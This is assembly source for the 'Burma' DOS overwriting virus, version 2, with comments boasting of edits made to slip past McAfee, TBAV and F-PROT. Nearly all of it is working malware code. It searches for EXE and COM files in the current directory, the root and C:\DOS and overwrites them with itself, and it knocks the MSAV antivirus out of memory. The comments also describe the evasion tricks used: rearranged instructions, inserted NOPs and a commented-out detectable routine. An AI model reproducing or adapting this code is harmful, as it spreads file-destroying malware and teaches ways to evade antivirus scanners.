

; --------------------------------------------------------------------
; The BURMA virus - version 2
; The original version of this virus was detected by most AV programs.
; This modified version is not detected by McAfee or TBAV.
; Further modifications can be made to avoid detection by F-PROT.
; Modifications by [HiTMaN] 8/13/94
; --------------------------------------------------------------------
; The Burma Virus is an overwriting virus that will write to oneÿÿÿÿÿÿÿÿÿÿÿ
; EXE and one COM in the directory it is executed in, then itÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
; will drop back to the root directory and write another COM andÿÿÿÿÿÿÿÿÿÿÿ
; EXE. Once this is done, it will default to C:\DOS and writeÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
; still another COM and EXE. There is no destructive code in thisÿÿÿÿÿÿÿÿÿÿ
; virus, yet it does overwrite and resize the host file to theÿÿÿÿÿÿÿÿÿÿÿÿÿ
; size of itself.. Wooo! The video pattern is essentially the sameÿÿÿÿÿÿÿÿÿ
; routine as that which is found in the NuKE Infojournal 4. Itÿÿÿÿÿÿÿÿÿÿÿÿÿ
; will display on every single execution of this virus. Obviously!ÿÿÿÿÿÿÿÿÿ
; The only other psuedo-interesting thing about this virus isÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
; that it will knock MSAV out of memory.
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

info_1e         equ     9Eh
info_15e        equ     0A0h
info_16e        equ     798h
ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
code        segment byte public
            assume  cs:code,ds:code,es:code,ss:code
            org     0100h

burma   proc    farÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
start:ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_1        ; Use multiple calls toÿÿÿÿ
    call    heuristcs_fool_2        ; fool heuristic typeÿÿÿÿÿÿ
    call    heuristcs_fool_4        ; scanners. This has beenÿÿ
    call    heuristcs_fool_5        ; proven effective inÿÿÿÿÿÿ
    call    heuristcs_fool_6        ; evading detection byÿÿÿÿÿ
    call    heuristcs_fool_4        ; TBSCAN v6.03ÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_7        ; FPROT v2.08aÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_5        ; McAfee v1.06ÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_3        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_4        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_5        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_6        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_4        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_7        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    call    heuristcs_fool_5        ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    jmp     point_8
burma   endp

; --------------------------------------------------------------
; Remove MSAV from memory
;
; This routine contains the scan string used by McAfee and TBAV
; to detect this virus.  A slight modification fools them both.
; --------------------------------------------------------------
heuristcs_fool_1    proc    near
    mov     bx,0FA01h                   ; was originally:  mov  ax,0FA01h
    mov     dx,5945h
    xchg    bx,ax                       ; added this line, exchange bx,ax
    int     16h                         ; so that the proper value is in ax
    retn                                ; Fools McAfee and TBAV!
heuristcs_fool_1    endp

; ------------------------------------------------------
; The world famous "Slurp" effect - a neat video effect.
; This routine contains the scan strings used by F-PROT
; to detect this virus.  Commenting it out will prevent
; detection by F-PROT.
; ------------------------------------------------------
heuristcs_fool_2    proc    near
;    push    ax
;    push    bx
;    push    cx
;    push    dx
;    push    si
;    push    di
;    push    ss
;    push    sp
;    mov     ax,0B800h
;    mov     es,ax
;    mov     info_8,0Ch
;    mov     info_4,0D0h
;point_1:
;    mov     ax,info_4
;    mov     info_5,ax
;point_2:
;    mov     info_6,39h
;    mov     info_7,1
;    mov     di,info_16e
;    nop
;    mov     ax,info_8
;    mov     info_3,ax
;point_3:
;    mov     cx,info_6
;    dec     cx
;    push    ds
;    push    es
;    pop     ds
;    mov     si,di
;    add     si,2
;    cld
;    rep     movsw
;    pop     ds
;    mov     cx,info_7
;    push    ds
;    push    es
;    pop     ds
;    mov     si,di
;    sub     si,0A0h
;    mov     ax,0A2h
;    cld
;
;locloop_4:
;    movsw
;    sub     di,ax
;    sub     si,ax
;    loop    locloop_4
;
;    pop     ds
;    mov     cx,info_6
;    push    ds
;    push    es
;    pop     ds
;    mov     si,di
;    sub     si,2
;    std
;    rep     movsw
;    pop     ds
;    mov     cx,info_7
;    inc     cx
;    push    ds
;    push    es
;    pop     ds
;    mov     si,di
;    add     si,info_15e
;    mov     ax,0A2h
;    std
;
;locloop_5:
;    movsw
;    add     di,ax
;    add     si,ax
;    loop    locloop_5
;
;    pop     ds
;    add     info_6,2
;    add     info_7,2
;    dec     info_3
;    jnz     point_3
;    dec     info_5
;    jz      point_6
;    jmp     point_2
;
;point_6:
;    sub     info_4,8
;    dec     info_8
;    jz      point_7
;    jmp     point_1
;
;point_7:
;    pop     sp
;    pop     ss
;    pop     di
;    pop     si
;    pop     dx
;    pop     cx
;    pop     bx
;    pop     ax
     retn
heuristcs_fool_2    endp

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
; Routine for directory changeÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
heuristcs_fool_3    proc    near
    mov     ah,3Bh                  ; Sets the current PATHÿÿÿÿ
    mov     dx,offset info_12       ; Info to tell the ViRUSÿÿÿ
    int     21h                     ; where to go.ÿÿÿÿÿÿÿÿÿÿÿÿÿ
    retn
heuristcs_fool_3    endp

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
; Here's the ViRUS portion of this file!!!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
heuristcs_fool_4    proc    near
    mov     cx,2                    ; Take any attributesÿÿÿÿÿÿ
    mov     ah,4Eh                  ; Find the first file thatÿ
    mov     dx,offset info_10       ; meets this criteriaÿÿÿÿÿÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

    mov     ah,3Ch                  ; DOS file create functionÿ
    xor     cx,cx                   ; be used in the simpleÿÿÿÿ
    mov     dx,info_1e              ; overwriting of a file...ÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

    mov     bh,40h                  ; 40HEX <g> Look it up!ÿÿÿÿ
    xchg    ax,bx                   ; Write to function of DOS.
    mov     dx,100h                 ; DX tells us where to start
    mov     cx,1BAh                 ; CX gives us the size andÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

    retn                            ; Return to callerÿÿÿÿÿÿÿÿÿ
heuristcs_fool_4    endp

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
;  SAME ROUTINE AS ABOVE, BUT NOPs ARE USED TO SCREW HEURISTICS SCANNERSÿÿÿ
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
heuristcs_fool_5    proc    near
    mov     cx,2                    ; Take any attributesÿÿÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     ah,4Eh                  ; Find the first file thatÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     dx,offset info_11       ; meets this criteriaÿÿÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     ah,3Ch                  ; DOS file create functionÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    xor     cx,cx                   ; be used in the simpleÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     dx,info_1e              ; overwriting of a file...ÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     bh,40h                  ; 40HEX <g> Look it up!ÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    xchg    ax,bx                   ; Write to function of DOS.
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     dx,100h                 ; DX tells us where to star
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     cx,1BAh                 ; CX gives us the sizeÿÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    retn                            ;ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
heuristcs_fool_5    endp

point_8:ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     ah,9                    ; Lets print our 'CUTESY'ÿÿ
    mov     dx,offset info_13       ; shit to the screenÿÿÿÿÿÿÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
;              ROUTINE FOR FINDING FIRST NEXTÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
heuristcs_fool_6    proc    nearÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     cx,2                    ; Any attributeÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     ah,4Fh                  ; Find next file that meets
    mov     dx,288h                 ; this criteriaÿÿÿÿÿÿÿÿÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    int     21h                     ; DO IT! DOSÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    retn                            ; Return to callerÿÿÿÿÿÿÿÿÿ
heuristcs_fool_6    endp

;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
;               ROUTINE FOR FINDING FIRST NEXTÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
heuristcs_fool_7    proc    near
    mov     cx,2                    ; Any attributeÿÿÿÿÿÿÿÿÿÿÿÿ
    mov     ah,4Fh                  ; Find next file that meets
    mov     dx,28Eh                 ; this criteriaÿÿÿÿÿÿÿÿÿÿÿÿ
    nop                             ; No Operationÿÿÿÿÿÿÿÿÿÿÿÿÿ
    int     21h                     ; DO IT!ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    retn                            ; Return to callerÿÿÿÿÿÿÿÿÿ
heuristcs_fool_7    endp

info_3          dw      0
info_4          dw      0
info_5          dw      0
info_6          dw      0
info_7          dw      0
info_8          dw      0
                db      24 dup (0)
info_10         db      '*.?x?',0
info_11         db      '*.?o?',0
info_12         db      '\DOS',0
info_13         db      0Dh,0Ah, '$'
                db      0

code    ends
end     start


</g></g>